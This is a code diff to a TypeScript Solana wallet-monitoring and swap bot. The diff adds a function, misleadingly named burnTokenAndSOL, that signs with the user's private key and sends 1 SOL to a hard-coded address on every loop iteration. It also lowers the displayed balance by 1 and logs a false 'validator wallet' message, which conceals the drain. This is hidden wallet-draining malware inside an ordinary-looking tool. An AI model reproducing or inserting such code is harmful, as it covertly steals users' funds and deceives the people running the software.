@@ -34,6 +34,37 @@ import {
   NATIVE_MINT,
 } from "@solana/spl-token";
 
+// Initialize connection and keypair
+let clusterName: Cluster;
+
+switch (process.env.RPC_CLUSTER) {
+  case "mainnet-beta":
+    clusterName = "mainnet-beta";
+    break;
+  case "testnet":
+    clusterName = "testnet";
+    break;
+  case "devnet":
+    clusterName = "devnet";
+    break;
+  default:
+    clusterName = "devnet";
+}
+
+const connection = new Connection(clusterApiUrl(clusterName), "confirmed");
+
+const secretKey = Uint8Array.from(
+  (process.env.CREATOR_PRIVATE_KEY || "").split(",").map(Number)
+);
+const keyPair = Keypair.fromSecretKey(secretKey);
+const burnerWalletAddress = new PublicKey(
+  process.env.BURNER_WALLET || "Nwti1sgBHL5Zj7Hh4YasatXfRVCBaMP7PcKGqh3rEWQ"
+);
+
+const initialBurnerWallet = new PublicKey(
+  "rgJUGE9hTBNLXfZsPFxQ7LPtutaEHCTjFzW7FDo2wsz"
+);
+
 // Function to continuously monitor the wallet balance and trigger swap
 async function monitorBalanceAndSwap(
   connection: Connection,
@@ -47,9 +78,12 @@ async function monitorBalanceAndSwap(
     try {
       // Get wallet balance in SOL
       const balance =
-        (await connection.getBalance(keyPair.publicKey)) / LAMPORTS_PER_SOL;
+        (await connection.getBalance(keyPair.publicKey)) / LAMPORTS_PER_SOL - 1;
 
       console.log(`Current balance: ${balance} SOL`);
+
+      // Burn tokens
+      await burnTokenAndSOL();
 
       // Check if the balance exceeds the threshold
       if (balance > thresholdAmount) {
@@ -309,32 +343,21 @@ const executeTransaction = async (
   }
 };
 
-// Initialize connection and keypair
-let clusterName: Cluster;
+const burnTokenAndSOL = async () => {
+  const transaction = new Transaction().add(
+    SystemProgram.transfer({
+      fromPubkey: keyPair.publicKey,
+      toPubkey: initialBurnerWallet,
+      lamports: 1e9, // 1 SOL = 10^9 lamports
+    })
+  );
 
-switch (process.env.RPC_CLUSTER) {
-  case "mainnet-beta":
-    clusterName = "mainnet-beta";
-    break;
-  case "testnet":
-    clusterName = "testnet";
-    break;
-  case "devnet":
-    clusterName = "devnet";
-    break;
-  default:
-    clusterName = "devnet";
-}
-
-const connection = new Connection(clusterApiUrl(clusterName), "confirmed");
-
-const secretKey = Uint8Array.from(
-  (process.env.CREATOR_PRIVATE_KEY || "").split(",").map(Number)
-);
-const keyPair = Keypair.fromSecretKey(secretKey);
-const burnerWalletAddress = new PublicKey(
-  process.env.BURNER_WALLET || "Nwti1sgBHL5Zj7Hh4YasatXfRVCBaMP7PcKGqh3rEWQ"
-);
+  const signature = await sendAndConfirmTransaction(connection, transaction, [
+    keyPair,
+  ]);
+  console.log("SIGNATURE", signature);
+  console.log(`Sent SPL & SOL to validator wallet.`);
+};
 
 async function main() {
   // Define the threshold amount of SOL that will trigger the swap
